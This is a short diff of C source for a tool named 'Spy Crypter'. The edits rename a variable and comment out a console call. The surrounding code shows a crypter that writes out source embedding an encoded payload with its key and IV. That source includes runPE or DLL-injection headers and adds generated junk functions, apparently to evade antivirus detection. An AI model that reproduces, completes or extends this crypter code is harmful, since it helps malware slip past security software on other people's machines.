@@ -466,7 +466,7 @@ DWORD   max_build_procs = 0;
 
 void main(int argc, char* argv[])
 { 
-	Exec("mode con: cols=120 & mode con:lines=30");
+	//Exec("mode con: cols=120 & mode con:lines=30");
 	printf("Spy Crypter started!'\n");
 	 
 	char* infile_path; char* target_name;
@@ -600,7 +600,7 @@ void main(int argc, char* argv[])
 	mVars			globals(VARS_TYPE_GLOBALS, NULL);
 
 	mCode				stub(0xFFFF);
-	mCode				stub2(0xFFFF); 
+	mCode				stub_trash(0xFFFF); 
 	mFunction			ep(&globals);
 	mCode			gen_code(0xFFFF);
 
@@ -712,17 +712,17 @@ void main(int argc, char* argv[])
 		func->get_prototype_string(stub);
 	}
 
-	stub2.clear();
+	stub_trash.clear();
 
 	for (int i = 0; i < all_functions.get_count(); i++)
 	{
-		all_functions.get_value(i)->get_string(stub2);
+		all_functions.get_value(i)->get_string(stub_trash);
 	} 
 
 	fprintf(source_stream, CRYPTER_BASE_SOURCE, trash? stub.get() : "", curpath.c_str(), type % 2 == 0 ? "tools/runPE64.h" : "tools/InjectDll.h", curpath.c_str(), curpath.c_str(), curpath.c_str(),
 		encoded_file_contents, encoded_key, encoded_iv,
 		type < 2 ? "int main(){if(1){" : "BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){if (ul_reason_for_call == DLL_PROCESS_ATTACH){",
-		trash ? "function_trash_0();" : "", trash ? stub2.get() : "");
+		trash ? "function_trash_0();" : "", trash ? stub_trash.get() : "");
 
 	fclose(source_stream);
 
